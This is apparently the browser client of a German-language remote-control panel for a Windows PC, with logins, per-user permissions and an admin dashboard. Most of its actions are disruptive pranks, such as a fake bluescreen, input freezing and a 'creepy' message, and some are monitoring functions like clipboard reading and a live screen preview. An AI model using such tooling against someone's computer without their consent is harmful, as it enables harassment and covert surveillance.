
var PC={fromHex:function(h){return Uint8Array.from((h.match(/../g)||[]).map(x=>parseInt(x,16)));},toHex:function(b){return Array.from(b,x=>x.toString(16).padStart(2,'0')).join('');}};
// Anzeige-Tab + Label pro Funktion. Reihenfolge/Bit-Index kommt vom Server (permItems).
var PERM_LABELS={
 lock:["Quick","Bildschirm sperren"],desktop:["Quick","Desktop zeigen"],sleep:["Quick","Schlafmodus"],shutdown:["Quick","Herunterfahren"],
 driftLeft:["Maus","Drift links"],driftRight:["Maus","Drift rechts"],driftUp:["Maus","Drift hoch"],driftDown:["Maus","Drift runter"],
 jitter:["Maus","Zittern"],teleport:["Maus","Teleport"],circle:["Maus","Kreis-Bewegung"],autoClick:["Maus","Auto-Klick"],
 bungee:["Maus","Bungee"],labyrinth:["Maus","Labyrinth"],scrollWheel:["Maus","Scroll-Rad"],boomerang:["Maus","Boomerang"],stopAll:["Maus","Alle Effekte stoppen"],
 mouseSpeedMin:["Maus","Speed minimum"],mouseSpeedNormal:["Maus","Speed normal"],swapButtons:["Maus","Tasten tauschen"],swapButtonsOff:["Maus","Tasten normal"],
 typeText:["Tastatur","Custom Text"],iSeeYou:["Tastatur","Creepy-Nachricht"],layoutSwap:["Tastatur","Layout Y/Z"],overwrite:["Tastatur","Ueberschreiben"],
 doubleSpace:["Tastatur","Doppel-Leerzeichen"],corruptor:["Tastatur","Korruptor"],capsToggle:["Tastatur","Caps Lock"],randomKey:["Tastatur","Zufallstaste"],
 altF4:["Tastatur","Alt+F4"],save:["Tastatur","Speichern (Strg+S)"],undo:["Tastatur","Rueckgaengig (Strg+Z)"],selectAllSpace:["Tastatur","Alles + Leerzeichen"],
 fakeBsod:["System","Fake Bluescreen"],rotate:["System","Bildschirm drehen"],virtDesktop:["System","Neuer Desktop"],winPSecond:["System","Nur Zweitbildschirm"],
 secondScreenBack:["System","Zweitbildschirm zurueck"],peekDesktop:["System","Desktop zeigen"],gfxReset:["System","Grafik-Reset"],windowDance:["System","Fenster-Tanz"],
 winELoop:["System","Explorer-Flut"],ctrlAltDel:["System","Strg+Alt+Entf"],taskMgr:["System","Task-Manager"],printDialog:["System","Druckdialog"],
 gameBar:["System","Game Bar"],xboxRecord:["System","Xbox-Aufnahme"],beep:["System","Zufalls-Beep"],
 stickyKeys:["Windows","Sticky Keys an"],stickyOff:["Windows","Sticky Keys aus"],filterKeys:["Windows","Filter Keys an"],filterOff:["Windows","Filter Keys aus"],
 mouseKeys:["Windows","MouseKeys an"],mouseKeysOff:["Windows","MouseKeys aus"],narrator:["Windows","Sprachausgabe"],osk:["Windows","Bildschirmtastatur"],
 magnifier:["Windows","Lupe"],magnifierClose:["Windows","Lupe schliessen"],printScreen:["Windows","Screenshot"],highContrast:["Windows","Hoher Kontrast"],
 browserSearch:["Browser","Suche"],browserBack:["Browser","Zurueck"],reopenTab:["Browser","Tab wieder oeffnen"],closeTab:["Browser","Tab schliessen"],
 zoomOut:["Browser","Zoom 25%"],history:["Browser","Verlauf"],downloads:["Browser","Downloads"],ytRestart:["Browser","YouTube 0"],
 mediaPlayPause:["Medien","Play/Pause"],mediaNext:["Medien","Naechster"],mediaPrev:["Medien","Vorheriger"],mediaMute:["Medien","Stumm"],volUp:["Medien","Lauter"],volDown:["Medien","Leiser"],
 admin:["Admin","Admin-Rechte (Accounts verwalten)"],
 mouseMove:["Maus","Live-Touchpad"],mouseLeft:["Maus","Linksklick"],mouseRight:["Maus","Rechtsklick"],mouseMiddle:["Maus","Mittelklick"],scrollUp:["Maus","Hochscrollen"],scrollDown:["Maus","Runterscrollen"],mouseDouble:["Maus","Doppelklick"]
};
Object.assign(PERM_LABELS,{"desktopPrev":["System","Desktop links"],"desktopNext":["System","Desktop rechts"],"desktopClose":["System","Desktop schließen"],"cancelShutdown":["Quick","Herunterfahren abbrechen"],"screenshotView":["Extras","Screenshot-Vorschau"],"pcStats":["Extras","PC-Auslastung"],"launchApp":["Extras","Ausgewählte Anwendung öffnen"],"browserFullscreen":["Browser","Vollbild (F11)"],"windowList":["Extras","Offene Fenster anzeigen"],"windowFocus":["Extras","Fenster nach vorne holen"],"windowMinimize":["Extras","Fenster minimieren"],"windowMaximize":["Extras","Fenster maximieren"],"windowRestore":["Extras","Fenster normal anzeigen"],"clipboardRead":["Extras","PC-Zwischenablage lesen"],"clipboardWrite":["Extras","Text in PC-Zwischenablage senden"],"showMessage":["Extras","Nachricht auf dem PC anzeigen"],"minimizeAll":["Extras","Alle Fenster minimieren"],"restoreAll":["Extras","Minimierte Fenster zurückholen"],"livePreview":["Extras","Live-Bildschirmvorschau"],"screenBlank":["Extras","Schwarzer Bildschirm (30 s)"],"desktopClock":["Extras","Vollbild-Uhr"],"countdown":["Extras","Vollbild-Countdown"],"screenColor":["Extras","Monitor-Farbtest"],"closeOverlays":["Extras","Alle Vollbild-Anzeigen schließen"],"windowSnapLeft":["Extras","Aktives Fenster links anordnen"],"windowSnapRight":["Extras","Aktives Fenster rechts anordnen"],"windowMonitorNext":["Extras","Aktives Fenster zum nächsten Monitor"],"browserNewTab":["Extras","Neuer Browser-Tab"],"tabNext":["Extras","Nächster Tab"],"tabPrev":["Extras","Vorheriger Tab"],"browserRefresh":["Extras","Seite neu laden"],"browserHardRefresh":["Extras","Seite ohne Cache neu laden"],"browserZoomIn":["Extras","Zoom vergrößern"],"browserZoomReset":["Extras","Zoom auf 100 %"],"mediaStop":["Extras","Medien stoppen"],"emojiPanel":["Extras","Emoji-Auswahl öffnen"],"snippingTool":["Extras","Bildschirmausschnitt wählen"],"pasteClipboard":["Extras","PC-Zwischenablage einfügen"],"openExplorer":["Extras","Explorer öffnen"],"openCalculator":["Extras","Rechner öffnen"],"openNotepad":["Extras","Editor öffnen"],"openSettings":["Extras","Windows-Einstellungen öffnen"],"hideCursor":["System","Mauszeiger verstecken"],"showCursor":["System","Mauszeiger zeigen"],"fakeUpdate":["System","Fake Windows-Update"],"speechLoop":["System","Sprach-Schleife"],"killExplorer":["System","Explorer killen"],"restartExplorer":["System","Explorer neu starten"],"blackout":["System","Dauer-Blackout"],"freezeInput":["System","Eingabe einfrieren"],"unfreezeInput":["System","Eingabe freigeben"],"volumeMax":["System","Lautstärke max"],"openCmd":["System","CMD öffnen"]});
var PERM_TAB_ORDER=["Quick","Maus","Tastatur","System","Windows","Browser","Medien","Extras","Admin"];
var permItems=[], permBytes=16;
var myUser="", myPermSet=new Set(), myAdmin=false, pendingPw=null, myToken=null;
var createEditorBuilt=false;
function permsHexToSet(hex,items){ var set=new Set(); if(!hex) return set; var b=PC.fromHex(hex); items.forEach(function(id,i){ if((b[i>>3]>>(i&7))&1) set.add(id); }); return set; }
function permsSetToHex(set,items,nbytes){ var b=new Uint8Array(nbytes); items.forEach(function(id,i){ if(set.has(id)) b[i>>3]|=(1<<(i&7)); }); return PC.toHex(b); }
function loadToken(){return myUser||null;}
function saveToken(t){myToken=t;}
/* ================= WEBSOCKET ================= */
var ws, wsConnected=false, permissionsReloading=false;
function connectWS(){
  ws=new WebSocket('wss://'+location.host+'/ws');
  ws.onopen=function(){
    wsConnected=true; document.getElementById('ws-status').textContent='Verbunden';
    // Session cookie is sent by the browser.
  };
  ws.onclose=function(){
    endPad(false); cooldownUntil={}; renderCooldowns();
    wsConnected=false; document.getElementById('ws-status').textContent='Getrennt...';
    logoutUI(); // Never leave stale controls visible after a disconnect.
    setTimeout(connectWS,2000);
  };
  ws.onmessage=function(e){var data;try{data=JSON.parse(e.data);}catch(err){return;}if(data.toast)toast(data.toast,data.type||'success');if(data.ev)handleEvent(data);};
}
function send(obj){ if(permissionsReloading) return; if(wsConnected) ws.send(JSON.stringify(obj)); else toast('Nicht verbunden!','error'); }
connectWS();

function handleEvent(d){
  if(d.ev==='loginOk'){ onLoginOk(d); loadScreens(); }
  else if(d.ev==='loginFail'){ loginError(d.msg || 'Falscher Benutzer oder Passwort'); }
  else if(d.ev==='resumeFail'){ saveToken(null); logoutUI(); }
  else if(d.ev==='userList'){ renderUsers(d); }
  else if(d.ev==='online'){ renderOnline(d.users); }
  else if(d.ev==='permissionsChanged'){
    if(permissionsReloading) return;
    endPad(); clearExtras(); permissionsReloading=true; myPermSet=new Set(); myAdmin=false;
    resetTimers.forEach(function(t){clearTimeout(t);}); resetTimers.clear(); counters.clear();
    document.getElementById('app').inert=true;
    document.getElementById('app').classList.add('hidden');
    var notice=document.getElementById('permission-notice'); notice.classList.remove('hidden'); notice.focus();
    setTimeout(function(){location.reload();},1800);
  }
  else if(d.ev==='filterRecovery'){
    recoveryBusy=!!d.active; if(recoveryBusy) endPad();
    var note=document.getElementById('recovery-note');
    var wasActive=!note.classList.contains('hidden');
    note.classList.toggle('hidden',!d.active);
    note.textContent='Filter Keys werden direkt zurückgesetzt.';
    document.querySelectorAll('[data-action="filterOff"]').forEach(function(b){b.disabled=!!d.active;});
    if(wasActive&&!d.active) toast('Entsperr-Tastenkombination gesendet');
    renderCooldowns();
  }
  else if(d.ev==='previewState'){setPreview(!!d.active,d.lease);}
  else if(d.ev==='effectState'){
    var toggle=document.querySelector('[data-toggle="'+d.name+'"]');
    if(toggle) toggle.classList.toggle('on',!!d.value);
    renderCooldowns();
  }
  else if(d.ev==='cooldown'){ setCooldown(d.action,d.ms); }
  else if(d.ev==='cooldownState'){ loadCooldowns(d.cooldowns||{}); }
  else if(d.ev==='cooldownConfig'){ showCooldownConfig(d.seconds); }
  else if(d.ev==='mouseGesture'){
    if(d.active && padPointer!==null) { padReady=true; pad.classList.add('tracking'); }
    else { endPad(false); }
    renderCooldowns();
  }
}
function renderOnline(list){
  var el=document.getElementById('online-bar'); if(!el) return;
  el.innerHTML='';
  if(!list||!list.length){ el.classList.add('hidden'); return; }
  el.classList.remove('hidden');
  var lbl=document.createElement('span'); lbl.className='online-label'; lbl.textContent='Online:'; el.appendChild(lbl);
  list.forEach(function(n){ var s=document.createElement('span'); s.className='online-chip'+(n===myUser?' me':''); s.textContent=n; el.appendChild(s); });
}

/* ================= LOGIN UI ================= */
var loginBtn=document.getElementById('login-btn');
function loginError(msg){ document.getElementById('login-err').textContent=msg; loginBtn.textContent='Anmelden'; loginBtn.disabled=false; }
async function api(path,body){const r=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json','X-Panic-Control':'1'},body:JSON.stringify(body)});let d=await r.json();if(!r.ok)throw Error(d.error||'Anfrage fehlgeschlagen');return d;}
async function doLogin(){
 const u=document.getElementById('login-user').value.trim(),p=document.getElementById('login-pass').value;
 if(!u||!p){loginError('Benutzer und Passwort eingeben');return;}
 loginBtn.disabled=true;loginBtn.textContent='Prüfe …';
 try{await api('/api/login',{user:u,password:p});document.getElementById('login-pass').value='';if(ws)ws.close();}
 catch(e){loginError(e.message);}
}
loginBtn.addEventListener('click', doLogin);
document.getElementById('login-pass').addEventListener('keydown', function(e){ if(e.key==='Enter') doLogin(); });

function onLoginOk(d){
  if(permissionsReloading) return;
  myUser=d.user; myAdmin=!!d.admin;
  
  if(d.items){ permItems=d.items; permBytes=d.pbytes||16; }
  if(d.perms!==undefined) myPermSet=permsHexToSet(d.perms, permItems);
  if(d.token) saveToken(d.token);
  document.getElementById('login-pass').value='';
  document.getElementById('login-err').textContent='';
  loginBtn.textContent='Anmelden'; loginBtn.disabled=false;
  document.getElementById('login-overlay').classList.add('hidden');
  document.getElementById('app').classList.remove('hidden');
  document.getElementById('logout-btn').classList.remove('hidden');
  document.getElementById('whoami').textContent='Angemeldet als '+myUser+(myAdmin?' (Admin)':'');
  applyPerms();
  loadCooldowns(d.cooldowns||{});
  if(d.cooldownSeconds) showCooldownConfig(d.cooldownSeconds);
  if(d.effects) Object.keys(d.effects).forEach(function(name){handleEvent({ev:'effectState',name:name,value:d.effects[name]});});
  document.getElementById('app').prepend(document.getElementById('recovery-note'));
  handleEvent({ev:'filterRecovery',active:!!d.filterRecovery});
  if(myAdmin){ send({cmd:'admin', op:'list'}); }
}
function logoutUI(){
  clearExtras();
  endPad(); cooldownUntil={}; renderCooldowns();
  myUser=''; myPermSet=new Set(); myAdmin=false; pendingPw=null; createEditorBuilt=false;
  document.getElementById('app').classList.add('hidden');
  document.getElementById('logout-btn').classList.add('hidden');
  var ob=document.getElementById('online-bar'); if(ob){ ob.innerHTML=''; ob.classList.add('hidden'); }
  document.getElementById('login-overlay').classList.remove('hidden');
  loginBtn.textContent='Anmelden'; loginBtn.disabled=false;
}
document.getElementById('logout-btn').addEventListener('click', async function(){try{await api('/api/logout',{});logoutUI();ws.close();}catch(e){toast(e.message,'error');}});

/* ================= RECHTE-BASIERTE UI (pro Funktion) ================= */
function allowedId(id){ return id==='ping' || (id && myPermSet.has(id)); }
function applyPerms(){
  // Buttons/Toggles nach ihrer eigenen Funktions-ID ein-/ausblenden
  document.querySelectorAll('[data-action],[data-toggle]').forEach(function(el){
    var id=el.dataset.action||el.dataset.toggle;
    el.classList.toggle('hidden', !allowedId(id));
  });
  // Karten ausblenden, deren Aktionen alle versteckt sind
  document.querySelectorAll('.card').forEach(function(card){
    var acts=card.querySelectorAll('[data-action],[data-toggle]');
    if(acts.length===0) return;
    var anyVisible=false; acts.forEach(function(a){ if(!a.classList.contains('hidden')) anyVisible=true; });
    card.classList.toggle('hidden', !anyVisible);
  });
  // Intensitaets-Karte (nur Slider) an die Maus-Rechte koppeln
  var ic=document.getElementById('card-intensity');
  if(ic){ var mp=['driftLeft','driftRight','driftUp','driftDown','jitter']; ic.classList.toggle('hidden', !mp.some(function(x){return myPermSet.has(x);})); }
  document.getElementById('drift-slider').closest('.slider-row').classList.toggle('hidden',!['driftLeft','driftRight','driftUp','driftDown'].some(function(x){return myPermSet.has(x);}));
  document.getElementById('jitter-slider').closest('.slider-row').classList.toggle('hidden',!myPermSet.has('jitter'));
  document.getElementById('tab-btn-admin').classList.toggle('hidden', !myAdmin);
  document.querySelectorAll('.tab').forEach(function(tab){
    if(tab.dataset.tab==='admin') return;
    var content=document.getElementById('tab-'+tab.dataset.tab); if(!content) return;
    var cards=content.querySelectorAll('.card'); var anyVisible=false;
    cards.forEach(function(c){ if(!c.classList.contains('hidden')) anyVisible=true; });
    tab.classList.toggle('hidden', !anyVisible);
  });
  var activeTab=document.querySelector('.tab.active');
  if(!activeTab || activeTab.classList.contains('hidden')){
    var first=document.querySelector('.tab:not(.hidden)'); if(first) activateTab(first);
  }
}
function activateTab(tab){
  if(tab.dataset.tab!=='extras')stopPreview();
  if(tab.dataset.tab!=='maus') endPad();
  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
  document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
  tab.classList.add('active');
  document.getElementById('tab-'+tab.dataset.tab).classList.add('active');
}
document.querySelectorAll('.tab').forEach(function(tab){ tab.addEventListener('click', function(){ activateTab(tab); }); });

/* ================= TOAST ================= */
var toastTimer;
function toast(msg,type){ type=type||'success'; clearTimeout(toastTimer); var t=document.getElementById('toast'); t.textContent=msg; t.className='toast show '+type; toastTimer=setTimeout(function(){ t.className='toast '+type; }, 2400); }

/* ================= BUTTON-BESTAETIGUNG ================= */
var counters=new Map(), resetTimers=new Map();
document.querySelectorAll('.btn[data-action]').forEach(function(btn){
  var action=btn.dataset.action;
  var need=parseInt(btn.dataset.confirm||'1');
  var counterEl=btn.querySelector('.counter');
  btn.addEventListener('click', function(){
    if(action==='livePreview'&&previewActive){executeAction(action,btn);return;}
    if(cooling(action)||(recoveryBusy&&action!=='stopAll'&&action!=='ping')) return;
    var cur=(counters.get(action)||0)+1; counters.set(action,cur);
    if(counterEl){counterEl.style.display='inline-block';counterEl.textContent=cur+'/'+need;}
    btn.classList.add('charging'); btn.style.setProperty('--progress',(cur/need*100)+'%');
    if(resetTimers.has(action)) clearTimeout(resetTimers.get(action));
    if(cur>=need){
      counters.delete(action); if(counterEl){counterEl.style.display='none';}
      btn.classList.remove('charging'); btn.style.removeProperty('--progress'); executeAction(action,btn);
    } else {
      var t=setTimeout(function(){ counters.delete(action); if(counterEl){counterEl.style.display='none';}
        btn.classList.remove('charging'); btn.style.removeProperty('--progress'); toast('Bestaetigung abgebrochen','error'); },3000);
      resetTimers.set(action,t);
    }
  });
});
function executeAction(action,btn){
  if(action==='selfDestruct'){
    var word=(document.getElementById('self-destruct-word').value||'').trim().toUpperCase();
    if(word!=='LOESCHEN'){ toast('Erst LOESCHEN eintippen','error'); return; }
    send({cmd:'action',action:'selfDestruct'});
    toast('Selbstzerstörung gestartet','error'); return;
  }
  if(action==='screenshotView'){ getScreenshot(); return; } else if(action==='pcStats'){ getStats(); return; }
 else if(action==='livePreview'){send({cmd:'preview',value:!previewActive});return;}
 else if(action==='countdown'){const seconds=Number(document.getElementById('countdown-seconds').value);if(!Number.isInteger(seconds)||seconds<1||seconds>600){toast('Countdown: 1–600 Sekunden','error');return;}send({cmd:'action',action:action,seconds:seconds});return;}
 else if(action==='screenColor'){send({cmd:'action',action:action,color:document.getElementById('screen-color').value});return;}
 else if(action==='windowList'){getWindows();return;} else if(['windowFocus','windowMinimize','windowMaximize','windowRestore'].includes(action)){const id=document.getElementById('window-select').value;if(!id){toast('Zuerst ein Fenster auswählen','error');return;}send({cmd:'action',action:action,window:id});return;}
 else if(action==='clipboardRead'){getClipboard();return;} else if(action==='clipboardWrite'){send({cmd:'action',action:action,text:document.getElementById('clipboard-text').value});return;}
 else if(action==='showMessage'){const text=document.getElementById('pc-message').value;if(!text.trim()){toast('Nachricht eingeben','error');return;}send({cmd:'action',action:action,text:text});return;}
 else if(action==='typeText'){
    var txt=document.getElementById('custom-text').value;
    if(!txt){toast('Kein Text eingegeben!','error');return;}
    send({cmd:'typeText',text:txt});
  } else if(action==='iSeeYou'){
    var t=document.getElementById('isee-text').value||'Ich sehe dich'; send({cmd:'iSeeYou',text:t});
  } else if(action==='browserSearch'){
    var q=document.getElementById('search-text').value; if(!q){toast('Kein Suchbegriff!','error');return;} send({cmd:'browserSearch',text:q});
  } else {
    send({cmd:'action',action:action});
  }
}

/* ================= TOGGLES / SLIDER ================= */
document.querySelectorAll('.toggle').forEach(function(t){
  t.setAttribute('role','switch'); t.tabIndex=0;
  function toggle(){ var on=t.classList.contains('on'); if(recoveryBusy||(!on&&cooling(t.dataset.toggle)))return; send({cmd:'toggle',name:t.dataset.toggle,value:!on}); }
  t.addEventListener('click',toggle);
  t.addEventListener('keydown',function(e){if(e.key===' '||e.key==='Enter'){e.preventDefault();toggle();}});
});
document.getElementById('drift-slider').addEventListener('input', function(e){ document.getElementById('drift-val').textContent=e.target.value; send({cmd:'slider',name:'drift',value:parseInt(e.target.value)}); });
document.getElementById('jitter-slider').addEventListener('input', function(e){ document.getElementById('jitter-val').textContent=e.target.value; send({cmd:'slider',name:'jitter',value:parseInt(e.target.value)}); });

/* ===== Gemeinsame Cooldowns: nur die Anzeige laeuft im Browser ===== */
var cooldownUntil={}, recoveryBusy=false;
function cooling(id){ return Math.max(0,(cooldownUntil[id]||0)-performance.now()); }
function setCooldown(id,ms){ if(permItems.indexOf(id)<0)return; cooldownUntil[id]=performance.now()+Math.max(0,Number(ms)||0); renderCooldowns(); }
function loadCooldowns(values){ cooldownUntil={}; Object.keys(values).forEach(function(id){cooldownUntil[id]=performance.now()+values[id];}); renderCooldowns(); }
function showCooldownConfig(seconds){ if(!seconds||seconds.length!==3)return; ['light','medium','heavy'].forEach(function(c,i){document.getElementById('cd-'+c).value=seconds[i];}); }
function renderCooldowns(){
  document.querySelectorAll('.btn[data-action]').forEach(function(b){
    var ms=cooling(b.dataset.action), blocked=recoveryBusy&&b.dataset.action!=='stopAll'&&b.dataset.action!=='ping';
    b.disabled=(ms>0||blocked)&&!(b.dataset.action==='livePreview'&&previewActive); b.classList.toggle('cooling',ms>0);
    var label=b.querySelector('.cooldown-label');
    if(ms>0){if(!label){label=document.createElement('span');label.className='cooldown-label';b.appendChild(label);} label.textContent=Math.ceil(ms/1000)+' s';}
    else if(label)label.remove();
  });
  document.querySelectorAll('[data-toggle]').forEach(function(t){
    var on=t.classList.contains('on'), ms=cooling(t.dataset.toggle);
    t.setAttribute('aria-checked',String(on)); t.setAttribute('aria-disabled',String(recoveryBusy||(!on&&ms>0)));
    t.title=!on&&ms>0?'Wieder bereit in '+Math.ceil(ms/1000)+' s':'';
  });
  if(typeof pad!=='undefined'&&pad){
    var ms=cooling('mouseMove'); pad.setAttribute('aria-disabled',String(recoveryBusy||(!padReady&&ms>0)));
    document.getElementById('mouse-pad-status').textContent=padReady?'Live verbunden – Finger bewegen':recoveryBusy?'Entsperrung laeuft':ms>0?'Neue Beruehrung in '+Math.ceil(ms/1000)+' s':'Finger hier bewegen';
  }
}
setInterval(function(){if(!document.hidden)renderCooldowns();},250);
document.getElementById('save-cooldowns').addEventListener('click',function(){
  var seconds=['light','medium','heavy'].map(function(c){var input=document.getElementById('cd-'+c);return input.value.trim()===''?NaN:Number(input.value);});
  if(seconds.some(function(n){return !Number.isInteger(n)||n<0||n>3600;})){toast('Bitte ganze Sekunden von 0 bis 3600 eingeben.','error');return;}
  send({cmd:'admin',op:'setCooldowns',seconds:seconds});
});

/* ===== Touchpad: gebuendelte relative Bewegung, maximal 30 Pakete/s ===== */
var pad=document.getElementById('mouse-pad'), padPointer=null, padReady=false, padX=0,padY=0,padDX=0,padDY=0,padTimer=null,padKeepalive=0;
function endPad(notify){
  if(typeof pad==='undefined'||!pad)return;
  var hadPointer=padPointer!==null; padPointer=null;padReady=false;padDX=padDY=0;
  clearInterval(padTimer);padTimer=null;pad.classList.remove('tracking');
  if(hadPointer&&notify!==false&&wsConnected)send({cmd:'mouse',phase:'end'});
}
pad.addEventListener('pointerdown',function(e){
  if(!e.isPrimary||e.button!==0||padPointer!==null||!allowedId('mouseMove')||cooling('mouseMove')||recoveryBusy||!wsConnected||permissionsReloading)return;
  e.preventDefault();padPointer=e.pointerId;padX=e.clientX;padY=e.clientY;padDX=padDY=0;padReady=false;padKeepalive=0;
  pad.setPointerCapture(e.pointerId);send({cmd:'mouse',phase:'start'});
  padTimer=setInterval(function(){
    if(!padReady||!wsConnected||permissionsReloading)return;
    if(ws.bufferedAmount>2048){padDX=padDY=0;return;}
    var dx=Math.max(-127,Math.min(127,Math.trunc(padDX))),dy=Math.max(-127,Math.min(127,Math.trunc(padDY)));
    if(dx||dy||performance.now()-padKeepalive>400){send({cmd:'mouse',phase:'move',dx:dx,dy:dy});padDX-=dx;padDY-=dy;padKeepalive=performance.now();}
  },34);
});
pad.addEventListener('pointermove',function(e){
  if(e.pointerId!==padPointer)return;e.preventDefault();
  padDX=Math.max(-254,Math.min(254,padDX+(e.clientX-padX)*1.4));padDY=Math.max(-254,Math.min(254,padDY+(e.clientY-padY)*1.4));padX=e.clientX;padY=e.clientY;
});
['pointerup','pointercancel','lostpointercapture'].forEach(function(type){pad.addEventListener(type,function(e){if(e.pointerId===padPointer){endPad();renderCooldowns();}});});
document.addEventListener('visibilitychange',function(){if(document.hidden)endPad();});
window.addEventListener('blur',function(){endPad();});

/* ================= ADMIN-DASHBOARD ================= */
// Rechte-Editor: Mini-Tabs mit Haekchen je Funktion. checkedSet = vorbelegte IDs.
function buildPermEditor(container, checkedSet){
  container.innerHTML=''; container.className='perm-editor';
  var groups={}; permItems.forEach(function(id){ var t=(PERM_LABELS[id]||["Sonstige",id])[0]; (groups[t]=groups[t]||[]).push(id); });
  var tabNames=PERM_TAB_ORDER.filter(function(t){ return groups[t]&&groups[t].length; });
  Object.keys(groups).forEach(function(t){ if(tabNames.indexOf(t)<0) tabNames.push(t); });
  var tabsEl=document.createElement('div'); tabsEl.className='pe-tabs';
  var bodyEl=document.createElement('div'); bodyEl.className='pe-body';
  tabNames.forEach(function(t,ti){
    var tb=document.createElement('div'); tb.className='pe-tab'+(ti===0?' active':''); tb.textContent=t; tabsEl.appendChild(tb);
    var panel=document.createElement('div'); panel.className='pe-panel'+(ti===0?' active':'');
    var allRow=document.createElement('label'); allRow.className='perm-check pe-all';
    var allCb=document.createElement('input'); allCb.type='checkbox';
    allRow.appendChild(allCb); allRow.appendChild(document.createTextNode('Alle in "'+t+'"'));
    panel.appendChild(allRow);
    var grid=document.createElement('div'); grid.className='perm-grid'; var cbs=[];
    groups[t].forEach(function(id){
      var lbl=document.createElement('label'); lbl.className='perm-check';
      var cb=document.createElement('input'); cb.type='checkbox'; cb.dataset.id=id; cb.checked=checkedSet.has(id); cbs.push(cb);
      lbl.appendChild(cb); lbl.appendChild(document.createTextNode((PERM_LABELS[id]||[,id])[1])); grid.appendChild(lbl);
    });
    panel.appendChild(grid);
    function refreshAll(){ allCb.checked=cbs.length>0 && cbs.every(function(c){return c.checked;}); }
    cbs.forEach(function(c){ c.addEventListener('change', refreshAll); }); refreshAll();
    allCb.addEventListener('change', function(){ cbs.forEach(function(c){ c.checked=allCb.checked; }); });
    tb.addEventListener('click', function(){
      tabsEl.querySelectorAll('.pe-tab').forEach(function(x){x.classList.remove('active');});
      bodyEl.querySelectorAll('.pe-panel').forEach(function(x){x.classList.remove('active');});
      tb.classList.add('active'); panel.classList.add('active');
    });
    bodyEl.appendChild(panel);
  });
  container.appendChild(tabsEl); container.appendChild(bodyEl);
}
function collectPermSet(container){ var set=new Set(); container.querySelectorAll('input[data-id]').forEach(function(cb){ if(cb.checked) set.add(cb.dataset.id); }); return set; }


function renderUsers(d){
  if(d.items){ permItems=d.items; permBytes=d.pbytes||16; }
  if(!createEditorBuilt){ buildPermEditor(document.getElementById('new-perms'), new Set()); createEditorBuilt=true; }
  var list=d.users||[];
  var choices=document.getElementById('cooldown-users'); choices.innerHTML='';
  list.forEach(function(u){
    var label=document.createElement('label');label.className='perm-check';
    var cb=document.createElement('input');cb.type='checkbox';cb.dataset.user=u.n;cb.checked=u.cd!==false;
    label.appendChild(cb);label.appendChild(document.createTextNode(u.n+(u.n===myUser?' (Du)':'')));choices.appendChild(label);
    cb.addEventListener('change',function(){
      if(!wsConnected||permissionsReloading){cb.checked=!cb.checked;toast('Nicht verbunden!','error');return;}
      cb.disabled=true;send({cmd:'admin',op:'setUserCooldown',user:u.n,enabled:cb.checked});
    });
  });
  var box=document.getElementById('user-list'); box.innerHTML='';
  list.forEach(function(u){
    var row=document.createElement('div'); row.className='user-row';
    var top=document.createElement('div'); top.className='top';
    var name=document.createElement('div'); name.className='uname'; name.textContent=u.n;
    if(u.a){ var b=document.createElement('span'); b.className='badge'; b.textContent='Admin'; name.appendChild(b); }
    if(u.n===myUser){ var y=document.createElement('span'); y.className='badge you'; y.textContent='Du'; name.appendChild(y); }
    var acts=document.createElement('div'); acts.className='acts';
    var editBtn=document.createElement('button'); editBtn.className='mini'; editBtn.textContent='Bearbeiten';
    var delBtn=document.createElement('button'); delBtn.className='mini del'; delBtn.textContent='Loeschen';
    acts.appendChild(editBtn); acts.appendChild(delBtn); top.appendChild(name); top.appendChild(acts); row.appendChild(top);

    var panel=document.createElement('div'); panel.className='edit-panel hidden';
    // Aktives Passwort anzeigen
    var pwRow=document.createElement('div'); pwRow.className='pw-row';
    pwRow.textContent='Passwort: geschützt gespeichert; kann neu gesetzt werden.';
    panel.appendChild(pwRow);
    // Rechte-Editor (vorbelegt)
    var edBox=document.createElement('div'); panel.appendChild(edBox);
    buildPermEditor(edBox, permsHexToSet(u.p, permItems));
    var saveBtn=document.createElement('button'); saveBtn.className='btn green small'; saveBtn.textContent='Rechte speichern'; saveBtn.style.marginBottom='10px';
    panel.appendChild(saveBtn);
    var np=document.createElement('input'); np.type='password'; np.className='text-input'; np.placeholder='Neues Passwort (optional)';
    panel.appendChild(np);
    var pwBtn=document.createElement('button'); pwBtn.className='btn blue small'; pwBtn.textContent='Passwort setzen';
    panel.appendChild(pwBtn); row.appendChild(panel); box.appendChild(row);

    editBtn.addEventListener('click', function(){ panel.classList.toggle('hidden'); });
    delBtn.addEventListener('click', function(){ if(confirm('Account "'+u.n+'" wirklich loeschen?')) send({cmd:'admin',op:'del',user:u.n}); });
    saveBtn.addEventListener('click', function(){ send({cmd:'admin',op:'setPerms',user:u.n,perms:permsSetToHex(collectPermSet(edBox),permItems,permBytes)}); });
    pwBtn.addEventListener('click', function(){
      var pw=np.value; if(pw.length<8){ toast('Passwort min. 8 Zeichen','error'); return; }
      if(pw.length>64){ toast('Passwort max. 64 Zeichen','error'); return; }
      pwBtn.textContent='...';
      setTimeout(function(){ send({cmd:'admin',op:'setPass',user:u.n,pw:pw}); np.value=''; pwBtn.textContent='Passwort setzen'; },15);
    });
  });
}
document.getElementById('create-user-btn').addEventListener('click', function(){
  var u=document.getElementById('new-user').value.trim();
  var p=document.getElementById('new-pass').value;
  if(!/^[A-Za-z0-9_-]{3,24}$/.test(u)){ toast('Name: 3-24 Zeichen (A-Z a-z 0-9 _ -)','error'); return; }
  if(p.length<8||p.length>64){ toast('Passwort 8-64 Zeichen','error'); return; }
  var btn=this; btn.textContent='Lege an...'; btn.disabled=true;
  setTimeout(function(){
    var perms=permsSetToHex(collectPermSet(document.getElementById('new-perms')),permItems,permBytes);
    send({cmd:'admin',op:'add',user:u,pw:p,perms:perms});
    document.getElementById('new-user').value=''; document.getElementById('new-pass').value='';
    btn.textContent='Account anlegen'; btn.disabled=false;
  },15);
});


let previewUrl,extrasEpoch=0,previewActive=false,previewTimer,previewSerial=0,previewLease='';
